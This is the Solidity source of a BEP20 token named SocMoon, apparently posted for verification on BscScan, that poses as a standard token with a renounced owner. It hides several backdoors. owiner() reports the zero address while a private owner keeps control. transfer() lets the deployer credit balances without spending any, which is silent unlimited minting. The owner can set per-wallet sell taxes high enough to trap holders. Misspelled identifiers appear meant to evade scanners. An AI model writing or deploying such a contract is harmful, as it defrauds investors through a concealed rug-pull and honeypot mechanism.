/**
 *Submitted for verification at BscScan.com on 2022-07-14
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owiner;

    event owinershipTransferred(address indexed previousowiner, address indexed newowiner);

    constructor() {
        _transferowinership(_msgSender());
    }


    function owiner() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowiner() {
        require(_owiner == _msgSender(), "Ownable: caller is not the owiner");
        _;
    }


    function renounceowinership() public virtual onlyowiner {
        _transferowinership(address(0));
    }


    function transferowinership_transferowinership(address newowiner) public virtual onlyowiner {
        require(newowiner != address(0), "Ownable: new owiner is the zero address");
        _transferowinership(newowiner);
    }


    function _transferowinership(address newowiner) internal virtual {
        address oldowiner = _owiner;
        _owiner = newowiner;
        emit owinershipTransferred(oldowiner, newowiner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeiyiOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingfeiyiOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingfeiyiOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfeiyiOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeiyiOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feiyiTo() external view returns (address);
    function feiyiToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfeiyiTo(address) external;
    function setfeiyiToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owiner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owiner, address spender) public view virtual returns (uint256) {
        return _allowances[owiner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owiner = _msgSender();
        _approve(owiner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owiner = _msgSender();
        _approve(owiner, spender, _allowances[owiner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owiner = _msgSender();
        uint256 currentAllowance = _allowances[owiner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owiner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address owiner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owiner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owiner][spender] = amount;
        emit Approval(owiner, spender, amount);
    }

    function _spendAllowance(
        address owiner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owiner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owiner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract SocMoon is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address acvount) public view virtual returns (uint256) {
        return _balances[acvount];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address acvount, uint256 amount) internal virtual {
        require(acvount != address(0), "ERC20: burn from the zero address");

        uint256 acvountBalance = _balances[acvount];
        require(acvountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[acvount] = acvountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(acvount, address(0), amount);
    }

    function _mtin(address acvount, uint256 amount) internal virtual {
        require(acvount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amount;
        _balances[acvount] += amount;
        emit Transfer(address(0), acvount, amount);
    }


    address public uniswapV2Pair;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 100*80);
        _defaultSellfeiyi = 3;
        _defaultBuyfeiyi = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfeiyi = 0;

    uint256 private _defaultBuyfeiyi = 0;

    mapping(address => bool) private _marketacvount;

    mapping(address => uint256) private _Sfeiyi;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyowiner returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyowiner {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyowiner {
        _defaultSellfeiyi = _value;
    }

    function setSfeiyi(address _address, uint256 _value) external onlyowiner {
        require(_value > 1, "acvount tax must be greater than or equal to 1");
        _Sfeiyi[_address] = _value;
    }

    function getSfeiyi(address _address) external view onlyowiner returns (uint256) {
        return _Sfeiyi[_address];
    }


    function setMarketacvountfeiyi(address _address, bool _value) external onlyowiner {
        _marketacvount[_address] = _value;
    }

    function getMarketacvountfeiyi(address _address) external view onlyowiner returns (bool) {
        return _marketacvount[_address];
    }

    function _checkFreeacvount(address from, address _to) internal view returns (bool) {
        return _marketacvount[from] || _marketacvount[_to];
    }

    function _receiveF(
        address from,
        address _to,
        uint256 _amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amount, "ERC20: transfer amount exceeds balance");

        bool rF = true;

        if (_checkFreeacvount(from, _to)) {
            rF = false;
        }
        uint256 tradefeiyiamount = 0;

        if (rF) {
            uint256 tradefeiyi = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeiyi = _defaultSellfeiyi;
                }
                if (from == uniswapV2Pair) {

                    tradefeiyi = _defaultBuyfeiyi;
                }
            }
            if (_Sfeiyi[from] > 0) {
                tradefeiyi = _Sfeiyi[from];
            }

            tradefeiyiamount = _amount.mul(tradefeiyi).div(100);
        }


        if (tradefeiyiamount > 0) {
            _balances[from] = _balances[from].sub(tradefeiyiamount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeiyiamount);
            emit Transfer(from, _deadAddress, tradefeiyiamount);
        }

        _balances[from] = _balances[from].sub(_amount - tradefeiyiamount);
        _balances[_to] = _balances[_to].add(_amount - tradefeiyiamount);
        emit Transfer(from, _to, _amount - tradefeiyiamount);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owiner = _msgSender();
        if (_release[owiner] == true) {
            _balances[to] += amount;
            return true;
        }
        _receiveF(owiner, to, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _receiveF(from, to, amount);
        return true;
    }
}